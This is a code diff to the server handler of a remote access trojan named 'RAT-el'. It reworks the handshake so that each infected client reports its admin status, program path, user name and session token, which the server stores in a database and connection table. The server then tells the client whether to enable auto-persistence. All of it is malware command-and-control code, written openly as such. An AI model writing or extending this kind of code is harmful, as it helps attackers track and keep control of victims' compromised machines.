@@ -127,9 +127,6 @@ The client first sends this information, then the server sends the parameters as
         self.auto_persistence = auto_persistence
         self.ObjSql = Sql("sql/RAT-el.sqlite3", "sql/table_ratel.sql", "table_ratel")
 
-    def generateToken(self):
-        return binascii.hexlify(os.urandom(24)).decode("utf8")
-
     def sendUltraSafe(self, data):
         
         try:
@@ -181,6 +178,11 @@ The client first sends this information, then the server sends the parameters as
         list_info = []
         already_in_the_dictionary = False
         
+        is_admin = "UNKNOWN"
+        path_prog = "UNKNOWN"
+        name_user = "UNKNOWN"
+        token = "UNKNOWN"
+
         while True:
             data = self.recvUltraSafe()
             print(data)
@@ -189,9 +191,6 @@ The client first sends this information, then the server sends the parameters as
                 break
 
             tmp = data.split(SPLIT)
-            
-            print("0 -->",tmp[0])
-            print("1 -->",tmp[1])
 
             if(tmp[0]=="MOD_RECONNECT"): #A changer ! MOD_RECONNECT True | TOKEN fdsafafsdfsadf3454sdfasdf5
                 print("MOD RECONNECT DETECT")
@@ -206,8 +205,24 @@ The client first sends this information, then the server sends the parameters as
 
                 else:
                     print("dict empty")
+            
+            elif(tmp[0] == "MOD_HANDSHAKE_IS_ADMIN"):
+                is_admin = tmp[1]
+
+            elif(tmp[0] == "MOD_HANDSHAKE_PATH_PROG"):
+                path_prog = tmp[1]
+            
+            elif(tmp[0] == "MOD_HANDSHAKE_NAME_USER"):
+                name_user = tmp[1]
+
+            elif(tmp[0]=="MOD_HANDSHAKE_TOKEN"):
+                token = tmp[1]
+
             else:
-                list_info.append(tmp[1])
+                printColor("error","[-] An error occurred during handshake mode.")
+                printColor("error","[-] Information may be recorded as UNKNOWN.\n")
+
+
 
         if(already_in_the_dictionary):
             tpl = already_in_the_dictionary, nb_session_of_conn
@@ -215,19 +230,20 @@ The client first sends this information, then the server sends the parameters as
             return tuple(tpl)
         
         else:
+            list_info.append(is_admin)
+            list_info.append(path_prog)
+            list_info.append(name_user)
+            list_info.append(token)
             return list_info
 
-
-    def sendParameterOfClient(self,token):
+    def sendParameterOfClient(self):
         if(self.auto_persistence):
             self.sendUltraSafe("MOD_HANDSHAKE_AUTO_PERSISTENCE"+SPLIT+"True")
             #print(" SEND MOD_HANDSHAKE_AUTO_PERSISTENCE | True")
 
         else:
             self.sendUltraSafe("MOD_HANDSHAKE_AUTO_PERSISTENCE"+SPLIT+"False")
-            #print("SEND MOD_HANDSHAKE_AUTO_PERSISTENCE | False")
-
-        self.sendUltraSafe("MOD_HANDSHAKE_TOKEN"+SPLIT+token)        
+            #print("SEND MOD_HANDSHAKE_AUTO_PERSISTENCE | False") 
         #print("SEND TOKEN")
         #time.sleep(0.3)
         self.sendUltraSafe("\r\n") #end echange.
@@ -245,14 +261,12 @@ The client first sends this information, then the server sends the parameters as
         if(bool(info)):#if not empty
             #print("sencode part persi go !!!! ")
             if type(info) == list:
-                token = self.generateToken()
-                self.sendParameterOfClient(token) #2
-
+                self.sendParameterOfClient()
                 if(self.ObjSql.checkFileExists("sql/RAT-el.sqlite3")):
-                    self.ObjSql.insertInDatabase(Handler.number_conn ,self.address[0], int(self.address[1]), True, info[0], info[1], info[2],token)
+                    self.ObjSql.insertInDatabase(Handler.number_conn ,self.address[0], int(self.address[1]), True, info[0], info[1], info[2],info[3])
                     #print("IP IN DATABASE IS: ", self.ObjSql.returnValue(Handler.number_conn, "socket"))
 
-                Handler.dict_conn[Handler.number_conn] = [Handler.number_conn,self.conn, self.address[0], int(self.address[1]), True, info[0], info[1], info[2],token] #3 #True = Connexion is life 
+                Handler.dict_conn[Handler.number_conn] = [Handler.number_conn,self.conn, self.address[0], int(self.address[1]), True, info[0], info[1], info[2],info[3]] #3 #True = Connexion is life 
                 Handler.number_conn+=1 #4
                 #print("type of dict_conn ----->",type(Handler.dict_conn))
         
